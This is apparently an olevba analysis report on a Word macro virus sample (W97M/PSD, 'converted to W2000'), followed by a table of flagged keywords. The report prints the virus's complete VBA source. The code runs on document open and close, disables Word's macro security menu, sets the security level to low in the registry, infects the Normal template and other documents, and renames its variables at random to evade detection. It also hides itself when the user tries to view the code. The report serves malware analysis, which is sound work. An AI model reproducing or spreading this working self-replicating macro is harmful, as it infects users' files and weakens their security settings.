olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-bbf098eccd66ac8093b96d0eca08e5a08e9aceb4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-bbf098eccd66ac8093b96d0eca08e5a08e9aceb4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Private Sub Document_Open()
On Error Resume Next
' W97M/PSD by ALT-F11, VAMP Poly by VicodinES
' Converted to W2000/PSD by VicodinES
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Day(Now) = Minute(Now) Then
Randomize: For FJ5573 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next FJ5573: End If
LV6894 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OU9782 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CO1575 = ActiveDocument.VBProject.VBComponents.Item(1)
VI7239 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CO1575 = NormalTemplate.VBProject.VBComponents.Item(1)
HF6458 = True
Call JR2657_AT6744
ActiveDocument.Saved = True
End If
If HF6458 <> True And VI7239 <> True Then GoTo EV414
If HF6458 = True Then CO1575.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LV6894 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If VI7239 = True Then CO1575.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OU9782 - 4))
EV414:
If OU9782 <> 0 And LV6894 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function JR2657_AT6744()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "JM7891": r1(2) = "OT8840": r1(3) = "CA3864": r1(4) = "JH9933": r1(5) = "AT6744": r1(6) = "LV6894"
r1(7) = "OU9782": r1(8) = "VI7239":: r1(9) = "CO1575": r1(10) = "HF6458": r1(11) = "EV414": r1(12) = "JR2657": r1(13) = "EL536": r1(14) = "NG1415": r1(15) = "FJ5573"
For FJ5573 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call AT6744(a1, r1(FJ5573))
Next FJ5573
End Function
Private Function AT6744(NG1415, EL536 As String)
On Error Resume Next
Dim JM7891 As Long: Dim OT8840 As Long: Dim CA3864 As Long: Dim JH9933 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
JM7891 = 1: OT8840 = 1: CA3864 = .CountOfLines: JH9933 = Len(.Lines(.CountOfLines, 1))
Do While .Find(EL536, JM7891, OT8840, CA3864, JH9933, True)
strline = .Lines(JM7891, 1)
strline = Left(strline, OT8840 - 1) & NG1415 & Mid(strline, JH9933)
.replaceline JM7891, strline
JM7891 = CA3864 + 1: OT8840 = 1:
CA3864 = .CountOfLines
JH9933 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

